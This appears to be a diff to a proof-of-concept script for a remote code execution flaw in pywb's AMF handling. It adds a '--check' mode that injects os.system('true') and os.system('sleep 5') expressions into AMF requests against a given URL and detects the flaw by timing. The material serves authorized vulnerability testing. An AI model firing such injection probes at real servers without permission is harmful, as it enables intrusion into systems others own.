@@ -25,13 +25,23 @@ therefore does not indicate failure. The script starts a real loopback server,
 accepts no target or command arguments, and removes temporary evidence after
 successful verification. Do not modify it to target systems you do not own or
 have permission to test.
+
+Authorized check mode:
+    PYTHONPATH=. .venv/bin/python pocs/amf_poc.py \
+      --check http://SERVER:8080/COLLECTION/mp_/http://example.invalid/
+
+    Exit 0 = affected, 1 = not affected, 2 = inconclusive. Three true and three
+    sleep 5 probes compare median response times. No files are written and no
+    arbitrary commands are accepted.
 """
 
 from gevent.monkey import patch_all
 
 patch_all()
 
+import argparse
 import shlex
+import statistics
 import tempfile
 import time
 from pathlib import Path
@@ -216,14 +226,81 @@ def run_ctf(lab: Path) -> None:
         app.warcserver_server.stop()
 
 
-def main() -> None:
+def timed_probe(session, url, expression, trials=3):
+    """Return elapsed seconds for repeated fixed-command AMF probes."""
+    packet = build_packet(expression)
+    elapsed = []
+    for trial in range(1, trials + 1):
+        started = time.monotonic()
+        try:
+            response = session.post(
+                url,
+                data=packet,
+                headers={"Content-Type": "application/x-amf"},
+                timeout=20,
+            )
+        except requests.RequestException as exc:
+            raise RuntimeError(f"request failed: {exc}") from exc
+        duration = time.monotonic() - started
+        print(f"    trial {trial}: HTTP {response.status_code}, {duration:.3f}s")
+        elapsed.append(duration)
+    return elapsed
+
+
+def run_check(url):
+    """Check an authorized replay URL without files or arbitrary commands."""
+    session = requests.Session()
+    session.trust_env = False
+    print("[+] Baseline: os.system('true')")
+    baseline = timed_probe(session, url, "__import__('os').system('true')")
+    print("[+] Delayed: os.system('sleep 5')")
+    delayed = timed_probe(session, url, "__import__('os').system('sleep 5')")
+
+    baseline_median = statistics.median(baseline)
+    delayed_median = statistics.median(delayed)
+    delta = delayed_median - baseline_median
+    print(f"[+] Baseline median: {baseline_median:.3f}s")
+    print(f"[+] Delayed median: {delayed_median:.3f}s")
+    print(f"[+] Delta: {delta:.3f}s")
+
+    # One decode produces a 5s delay and two produce approximately 10s. Require
+    # all timing medians to distinguish that delay from ordinary HTTP latency.
+    affected = (
+        baseline_median < 3.0
+        and delayed_median >= 4.5
+        and delta >= 3.0
+    )
+    if affected:
+        print("[+] AFFECTED: command-execution timing is consistent with sleep 5")
+        return 0
+
+    print("[+] NOT AFFECTED: no command-execution timing was observed")
+    return 1
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(description=__doc__)
+    parser.add_argument(
+        "--check",
+        metavar="URL",
+        help="check an authorized replay URL using harmless true/sleep 5 probes",
+    )
+    args = parser.parse_args()
+    if args.check:
+        try:
+            return run_check(args.check)
+        except Exception as exc:
+            print(f"[!] INCONCLUSIVE: {exc}")
+            return 2
+
     Path(tempfile.gettempdir()).mkdir(parents=True, exist_ok=True)
     with tempfile.TemporaryDirectory(
         prefix="pywb-amf-rce-ctf-", dir="/tmp/opencode"
     ) as directory:
         run_ctf(Path(directory))
     print("[+] Server stopped; temporary evidence cleaned up")
+    return 0
 
 
 if __name__ == "__main__":
-    main()
+    raise SystemExit(main())
